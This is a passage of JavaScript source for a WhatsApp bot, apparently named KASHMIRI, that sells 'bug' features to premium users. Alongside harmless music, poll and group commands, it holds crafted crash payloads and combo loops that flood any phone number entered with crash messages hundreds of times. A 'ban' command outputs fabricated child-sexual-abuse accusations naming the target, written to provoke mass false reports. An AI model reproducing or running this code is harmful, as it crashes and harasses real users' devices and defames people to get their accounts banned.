          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs.readFileSync("./čicítzyBug.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdxreply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "© KASHMIRI  🔥 Func f10",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoxreply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log('© KASHMIRI  🔥 Func f10')
};
 // BATAS CODE FUNC KASHMIRI 



  // COMBO FUNC V1 KASHMIRI  🐉
    async function Comboxx0(target) {
      for (let i = 0; i < 20; i++) {
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

  // COMBO FUNC V1 KASHMIRI  🐉
    async function Comboxx1(target) {
      for (let i = 0; i < 20; i++) {
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await DocFc(target)
        await InvisibleLoadFast(target)
        await InvisiPayload(target)
        await MSGSPAM(target)
        await DocFc(target)
        await NewIos(target, Ptcp = true)
        await invc2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
        await DocFc(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await await NotifKill(target)
        await crashui2(target, ptcp = true)
        await OverloadCursor(target, ptcp = true)
      }
    }

   // COMBO FUNC IPONG KASHMIRI  🐉
    async function Comboxx2(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await iponcrash(target)
        await aipong(target)
        await await FBiphone(target)
        await QDIphone(target)
        await QXIphone(target)
      }
    }
    
    // COMO FUNC IOS KASHMIRI  🐉
    async function Comboxx3(target) {
      for (let i = 0; i < 20; i++) {
        await InvisiPayload(target)
        await UpiCrash(target)
        await VenCrash(target)
        await AppXCrash(target)
        await SmCrash(target)
        await SqCrash(target)
        await FBiphone(target)
        await QXIphone(target)
        await QPayIos(target)
        await QPayStriep(target)
        await QDIphone(target)
        await XiosVirus(target)
      }
    }
    // COMO FUNC FREZE KASHMIRI  🐉
    async function Comboxx4(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
      }
    }
    
   // COMO FUNC UI KASHMIRI  🐉
    async function Comboxx5(target) {
      for (let i = 0; i < 20; i++) {
        await FrezeeMsg1(target)
        await FrezeeMsg2(target)
        await f10(target, Ptcp = true)
        await NotifKill(target)
        await DocBug(target)
        await LocaBugs(target)
        await BlankScreen(target, Ptcp = true)
        await UICRASH(target, ptcp = true)
        await crashUiV5(target, Ptcp = true)
        await systemUi(target, Ptcp = true)
      }
    }
    
   // COMO ALL FUNC KASHMIRI  🐉
    async function Comboxx6(target) {
      for (let i = 0; i < 10; i++) {
        await Comboxx0(target)
        await Comboxx1(target)
        await Comboxx2(target)
        await Comboxx3(target)
        await Comboxx4(target)
        await Comboxx5(target)
      }
    }
//End
   
async function premRep() {
var nln = [
`👋Hello There`,
`Checking Prem List`,
`Sorry\nYou aren't a premium user`
]
let { key } = await conn.sendMessage(chat, {text: 'Loading....'}, { quoted: zets })

for (let i = 0; i < nln.length; i++) {
await conn.sendMessage(chat, {text: nln[i], edit: key });
}
}
        const send = async (text) => {
        await conn.sendMessage(chat, { text: text }, { quoted: zets })
	  }
	  

      
        //Commands here
        switch (command) {
    case "ping": { 
    let timestamp = speed();
    let latency = speed() - timestamp;
    xreply(`👋 𝐇𝐞𝐥𝐥𝐨 ${pushname} 𝐓𝐡𝐢𝐬 𝐈𝐬 𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈\n𝐁𝐨𝐭 𝐒𝐩𝐞𝐞𝐝 𝐈𝐬 ${latency.toFixed(4)} 𝐌𝐬\n𝐁𝐨𝐭 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐈𝐬 ${runtime(process.uptime())}.`);
} 
break
		
            case 'play': {
    if (!q) return xreply(`*Example*: ${prefix + command} yansh na yansh*`);

    try {
        // React to the message
        await conn.sendMessage(chat, { react: { text: '🎵', key: mess.key } });

        // YouTube search
        const yts = require("yt-search");
        let search = await yts(q);
        let video = search.videos[0]; // Get the first video result

        if (!video) {
            return xreply('*No results found. Please try another query.*');
        }

        // Prepare the body text for the xreply
        let body = "_Processing_";

        // Send video thumbnail and details
        await conn.sendMessage(
            chat,
            {
                image: { url: video.thumbnail },
                caption: body,
            },
            { quoted: zets }
        );

        // Call YouTube MP3 download API
        const axios = require("axios");
        const apiResponse = await axios.get('https://api.davidcyriltech.my.id/download/ytmp3', {
            params: { url: video.url }
        });

        if (apiResponse.data.success) {
            const { download_url, title, thumbnail } = apiResponse.data.result;

            // Send the audio file
            await conn.sendMessage(
                chat,
                {
                    audio: { url: download_url },
                    mimetype: 'audio/mp4',
                    ptt: true,
                    mediaType: 1,
                    fileName: `${title}.mp3`,
                    caption: `🎧 *Here's your song:*\n> *Title:* ${title}`,
                },
                { quoted: zets }
            );
        } else {
            return xreply('*Error fetching the song. Please try again later!*');
        }
    } catch (error) {
        console.error('Error during play command:', error);
        return xreply('*An error occurred while processing your request. Please try again later.*');
    }
    }
    break
// WhatsApp Bot Event Listener
conn.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const m = chatUpdate.messages[0];
        if (!m.message) return;
        const chat = m.key.remoteJid;
        const isGroup = chat.endsWith('@g.us');

        if (!isGroup) return; // Only allow in groups

        const type = Object.keys(m.message)[0];
        const body = type === 'conversation' ? m.message.conversation 
            : type === 'extendedTextMessage' ? m.message.extendedTextMessage.text 
            : '';

        const prefix = "."; // Change this if you use a different prefix
        if (!body.startsWith(prefix)) return;

        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const sender = m.key.participant || m.key.remoteJid;

        switch (command) {
            case 'add':
                await addUserToGroup(conn, chat, sender, args, m);
                break;
            // Add more commands here as needed
        }
    } catch (err) {
        console.error('Error handling command:', err);
    }
});
 case 'play2': {
    if (!q) return xreply(`*Example*: *${prefix + command} Taka Taka funk*`);

    try {
        // React to the message with a movie emoji
        await conn.sendMessage(chat, { react: { text: '📽️', key: mess.key } });

        // Perform a YouTube search
        const yts = require("yt-search");
        let search = await yts(q);
        let video = search.videos[0]; // Get the first video result

        if (!video) {
            return xreply(`*No results found. Please try another query.*`);
        }

        // Prepare video details to display
        let body = "_Processing_";

        // Send video details with the thumbnail
        await conn.sendMessage(
            chat,
            {
                image: { url: video.thumbnail },
                caption: body,
            },
            { quoted: callg }
        );

        // Fetch video download link from the API
        const axios = require("axios");
        const apiUrl = "https://api.davidcyriltech.my.id/download/ytmp4";
        const apiResponse = await axios.get(apiUrl, {
            params: { url: video.url }
        });

        // If the API response indicates success, send the video
        if (apiResponse.data.success) {
            const { title, download_url } = apiResponse.data.result;

            await conn.sendMessage(
                chat,
                {
                    video: { url: download_url },
                    mimetype: 'video/mp4',
                    caption: "*_Enjoy your song_*",
                },
                { quoted: zets }
            );
        } else {
            // If the API fails, notify the user
            return xreply(`*Error fetching the video! Please try again later.*`);
        }
    } catch (error) {
        console.error('Error during video command:', error);
        xreply(`*An error occurred while processing your request. Please try again later.*`);
    }
    }
    break
    const tagAllMembers = async (sock, groupJid, message, sender) => {
    try {
        // Fetch group metadata
        const groupMetadata = await sock.groupMetadata(groupJid);
        const participants = groupMetadata.participants;

        if (!participants || participants.length === 0) {
            return console.log("No members found in the group.");
        }

        // Generate mentions
        const mentions = participants.map(member => member.id);
        const textMessage = `*Message from @${sender.split('@')[0]}:*\n\n` +
            `_${message}_\n\n` +
            mentions.map(id => `@${id.split('@')[0]}`).join(' ');

        // Send message with mentions
        await sock.sendMessage(groupJid, {
            text: textMessage,
            mentions: mentions
        });

        console.log("Tagall message sent successfully.");
    } catch (error) {
        console.error("Error in tagAllMembers:", error);
    }
};

// Command handling inside message event
const handleCommand = async (sock, msg) => {
    const { body, key, participant, remoteJid } = msg;
    const sender = participant || key.remoteJid;
    
    if (!body.startsWith('.')) return; // Ignore non-command messages

    const args = body.trim().split(/ +/);
    const command = args.shift().toLowerCase();

    switch (command) {
        case ".tagall":
            if (!remoteJid.endsWith("@g.us")) {
                await sock.sendMessage(remoteJid, { text: "This command can only be used in groups!" });
                return;
            }
            const message = args.join(" ") || "Hello everyone!";
            await tagAllMembers(sock, remoteJid, message, sender);
            break;

        default:
            console.log("Unknown command:", command);
    }
};
case 'mycase': 
case 'getcase':
case 'cases':
if (!isCreator) {
    await premRep();
    return; // Exit the case after sending the "premRep" function
  }
if (!q) return xreply("What's The Case?")
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("index.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
conn.sendMessage(chat, { caption: `${getCase(q)}\n> 🪷⃟⃨〫⃰‣ ⁖𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 🪷`, image: { url: "https://g.top4top.io/p_333301jy90.jpg" } }, { quoted: zets })
break
case "public": {
if (!isCreator) {
    await premRep();
    return; // Exit the case after sending the "premRep" function
  }
 xreply("succes change status to public")
 conn.public = true
}
break
case "self": {
if (!isCreator) {
    await premRep();
    return; // Exit the case after sending the "premRep" function
  }
				xreply("succes change status to self")
				conn.public = false
			}
			break
case "disp90": { 
                 if (!isBotAdmins) return xreply(`Bot must be admin`) 
                 if (!isAdmins) return xreply(`admin feature `)
                 if (!q) return xreply(`provide text for for gc subject`)
                     await conn.groupToggleEphemeral(chat, 90*24*3600); 
 xreply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break 
case 'creategc': case 'creategroup': {
if (!isCreator) {
await premRep
}
if (!args.join(" ")) return xreply(`Use ${prefix+command} groupname`)
let cret = await conn.groupCreate(args.join(" "), [])
let response = await conn.groupInviteCode(cret.id)
let capt = `     「 Created Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `;
await conn.sendMessage(chat, { text: capt}, {quoted:zets})
}
break
 case "getdevice": {
 if (!isCreator) {
            return xreply("𝐃𝐮𝐝𝐞 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 𝐎𝐧𝐥𝐲");
          } 
  if (!mess.quoted) {
    return xreply('*𝐇𝐞𝐲 𝐁𝐚𝐬𝐭𝐚𝐫𝐝,𝐑𝐞𝐩𝐥𝐲 𝐓𝐨 𝐀 𝐌𝐞𝐬𝐬𝐚𝐠𝐞*');
  }

  try {
    // Get the quoted message
    const quotedMsg = await mess.getQuotedMessage();

    if (!quotedMsg) {
      return xreply('*𝐔𝐬𝐞𝐫`𝐬 𝐃𝐞𝐯𝐢𝐜𝐞 𝐂𝐨𝐮𝐥𝐝 𝐍𝐨𝐭 𝐁𝐞 𝐅𝐨𝐮𝐧𝐝\n𝐓𝐫𝐲 𝐖𝐢𝐭𝐡 𝐀 𝐍𝐞𝐰 𝐌𝐞𝐬𝐬𝐚𝐠𝐞*');
    }

    const messageId = quotedMsg.key.id;

    // Determine the device using the getDevice function from Baileys
    const device = getDevice(messageId) || 'Unknown';

    let devResult = `_!thís usєr ís σn αn ${device} dєvícє!_.`;
    conn.sendMessage(chat, { text: devResult },{quoted: zets});
  } catch (err) {
    xreply('Error determining device: ' + err.message);
  }
}
break
case "subject": case "changesubject": { 
                 if (!isBotAdmins) return xreply(`I Need Admin Privileges To Complete This command`) 
                 if (!isAdmins) return xreply(`admin feature`)
                 if (!q) return xreply(`provide text for gc subject`)
                 await conn.groupUpdateSubject(chat, text); 
 xreply('Group name successfully updated! 👍'); 
             } 
             break
           case "desc": case "setdesc": { 
                 if (!isBotAdmin) return xreply(`I Need Admin Privileges To Complete This command`) 
                 if (!isAdmins) return xreply(`admin feature`)
                 if (!q) return xreply(`provide text for gc desc`)
                 await conn.groupUpdateDescription(chat, text); 
 xreply(`Group description successfully updated! 👥\n> 𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 `); 
             } 
 break
 case "disp-off": { 
                 if (!isBotAdmins) return xreply(`Bot must be admin`) 
                 if (!isAdmins) return xreply(`admin feature `)
                 if (!q) return xreply(`provide text for for gc subject`)
  
                     await conn.groupToggleEphemeral(chat, 0); 
 xreply('Dissapearing messages successfully turned off!'); 
 }
          break
case 'poll': {
if (!isCreator) {
await premRep
}
            let [poll, opt] = q.split("|")
            if (text.split("|") < 2)
return await xreply(
`You Used The Command Wrong\nCorrect Use: .poll Who is better|messi,ronaldo,neymar...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await conn.sendMessage(chat, {
poll: {
name: poll,
values: options
}
 })
  }
break
/*
I used this in menu now it's giving me this Error 
conn.sendMessage(m.chat, { caption: caption, video: { url: viddi } }, { quoted: ctt });
It's giving this error 
*/
case 'menu': {
    // List of random image URLs (you can add more)
    const images = [
        "https://files.catbox.moe/ujukuy.png"
    ];
    
    // Pick a random image
    const randomImage = images[Math.floor(Math.random() * images.length)];

    if (!isCreator) {
        xreply(`  𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𝗩𝗜𝗣 𝗔𝗰𝗲𝘀𝘀
┏━━━━━━━━━━━━⊙
┃♖︎ 𝐔𝐬𝐞𝐫 :  ${pushname} 
┃❅ 𝐁𝐨𝐭 𝐏𝐫𝐞𝐟𝐢𝐱 : *(.)*
┃☂︎ 𝐒𝐩𝐞𝐞𝐝 : ${latency.toFixed(4)}
┃♕︎ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : +923255156992
┃♙︎ 𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : KASHMIRI BOT XI
┃❅ *Follow owner channel for free trials*
┃♖︎ *Channel link* https://whatsapp.com/channel/0029VaieFO2HFxOtUtwLvQ0b
┗━━━━━━━━━━━━━━⦿
${readmore}\nSorry, Menu is only visible to Premium Users. Upgrade to access all features.`);
        console.log("Sorry, You Are Not a Premium User");
    } else {
        let Menu1 = `
┏━━━〈〈 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 〉〉━━━
┣🚀 Status : *online*
┣🚀 Version : *XI*
┣🚀 Creator : *https://whatsapp.com/channel/0029VaieFO2HFxOtUtwLvQ0b*
┣🚀𝐁𝐨𝐭 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐈𝐬 ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━
┏━━━〈〈 *BUG MENU*〉〉━━━
┣🚀 .*xinvis*
┣🚀 .*xiphone*
┣🚀 .*xtrash*
┣🚀 .*xcrash*
┣🚀 .*xhard*
┗━━━━━━━━━━━━━━━━
┏━━━〈〈 *Ban Menu* 〉〉━━━
┣🚀 .*ban* 𝟐𝟑𝟒____
┗━━━━━━━━━━━━━━━━
┏━━━〈〈 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 〉〉━━━
┣🚀 .𝗱𝗶𝘀𝗽-𝗼𝗳𝗳
┣🚀 .𝗱𝗶𝘀𝗽-𝟵𝟬
┣🚀 .𝗱𝗶𝘀𝗽-𝟳
┣🚀 .𝗰𝗵𝗮𝗻𝗴𝗲𝘀𝘂𝗯𝗷𝗲𝗰𝘁 [𝗰𝗵𝗮𝗻𝗴𝗲 𝗴𝗿𝗼𝘂𝗽 𝗻𝗮𝗺𝗲]
┣🚀 .𝘀𝗲𝘁𝗱𝗲𝘀𝗰 [𝗰𝗵𝗮𝗻𝗴𝗲 𝗴𝗿𝗼𝘂𝗽 𝗱𝗲𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻]
┗━━━━━━━━━━━━━━━━
┏━━━〈〈 𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂 〉〉━━━
┣🚀 .𝗴𝗶𝘁𝗰𝗹𝗼𝗻𝗲 
┣🚀 .𝗸𝗮𝗸𝗮𝘀𝗵𝗶
┣🚀 .𝘀𝗮𝘀𝘂𝗸𝗲
┗━━━━━━━━━━━━━━━━`;

        // Send menu with random image
        conn.sendMessage(chat, { image: { url: randomImage }, caption: Menu1 }, { quoted: zets });
    }
}
break;
case 'xinvis': {
  if (!isCreator) {
    await premRep();
    return;
  }
  if (!q) return xreply(`Example: ${prefix + command} 254###`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (developerNumbers.includes(target)) {
    return xreply("✘ Cannot send bugs to developer.");
  } 
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`);
  try {
    for (let i = 0; i < 800; i++) {
      await Comboxx0(target);
      await Comboxx1(target);
    }
  } catch (e) {
    return xreply("Error: " + e);
  }
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
  await sleep(2000);
  await conn.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: zets });
}
break;
case 'xhard': {
  if (!isCreator) {
    await premRep();
    return;
  }
  if (!q) return xreply(`Example: ${prefix + command} 254###`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (developerNumbers.includes(target)) {
    return xreply("✘ Cannot send bugs to developer.");
  } 
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`);
  try {
    for (let i = 0; i < 800; i++) {
      await Comboxx0(target);
      await Comboxx1(target);
      await Comboxx2(target);
      await Comboxx3(target);
      await Comboxx4(target);
      await Comboxx5(target);
      await Comboxx6(target);
    }
  } catch (e) {
    return xreply("Error: " + e);
  }
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
  await sleep(2000);
  await conn.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: zets });
}
break;
case 'xtrash': {
  if (!isCreator) {
    await premRep();
    return;
  }
  if (!q) return xreply(`Example: ${prefix + command} 254###`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (developerNumbers.includes(target)) {
    return xreply("✘ Cannot send bugs to developer.");
  } 
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`);
  try {
    for (let i = 0; i < 800; i++) {
      await Comboxx3(target);
      await Comboxx4(target);
    }
  } catch (e) {
    return xreply("Error: " + e);
  }
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
  await sleep(2000);
  await conn.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: zets });
}
break;
case 'xcrash': {
  if (!isCreator) {
    await premRep();
    return;
  }
  if (!q) return xreply(`Example: ${prefix + command} 254###`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (developerNumbers.includes(target)) {
    return xreply("✘ Cannot send bugs to developer.");
  } 
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`);
  try {
    for (let i = 0; i < 800; i++) {
      await Comboxx5(target);
    }
  } catch (e) {
    return xreply("Error: " + e);
  }
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
  await sleep(2000);
  await conn.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: zets });
}
break;
case 'xiphone': {
  if (!isCreator) {
    await premRep();
    return;
  }
  if (!q) return xreply(`Example: ${prefix + command} 254###`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (developerNumbers.includes(target)) {
    return xreply("✘ Cannot send bugs to developer.");
  } 
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚒𝚗𝚐 🪐
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
│፨ 𝚗𝚘𝚝𝚎 : 𝚠𝚊𝚒𝚝 𝚏𝚘𝚛 3 𝚖𝚒𝚗𝚜
└─────────`);
  try {
    for (let i = 0; i < 800; i++) {
      await Comboxx2(target);
    }
  } catch (e) {
    return xreply("Error: " + e);
  }
  xreply(`┌─────────
│፨ 𝚜𝚝𝚊𝚝𝚞𝚜 : 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚘𝚠𝚗 🌒
│፨ 𝚝𝚊𝚛𝚐𝚎𝚝 : ${target}
│፨ 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : ${command}
└─────────`);
  await sleep(2000);
  await conn.sendMessage(m.chat, { audio: bug, mimetype: 'audio/mpeg' }, { quoted: zets });
}
break;
case 'ban': 
        if (!q) return xreply(`Syntax Error\nUsage: ${prefix + command} 20x`);
        target = q.replace(/[^0-9]/g,'');
        xreply(`بند فنش نار وربي يبلع في بلاغ واحد 🔥
Здесь есть детская порнография и выдача себя за WhatsApp, и они помогают выдавать себя за персонажей WhatsApp в сексе с детьми. 1000 8-летних девочек будут трахаться, и с нашей помощью в Дартшате WhatsApp будет пролита детская кровь, и партнер WhatsApp. быть уничтожен вместе с партнером WhatsApp «ужасного» лидера Аль-Ямани.  Дети продаются через чат WhatsApp. Цена девочки 500 000$. Для продолжения секса с детьми 8 лет и для покупки детей обращайтесь к нам через WhatsApp отсюда: 👇
https://api.whatsapp.com/send?phone=${target}
 `);
case "addowner":
case "addprem":
case "addmurbug": {
if (!isCreator) {
await premRep();
return;
}
if (!args[0]) return xreply(`Example : \n${prefix + command} 234xx`)
prem1 = q.split("|")[0].replace(/[^0-9]/g, "")
let cek1 = await conn.onWhatsApp(prem1 + `@s.whatsapp.net`)
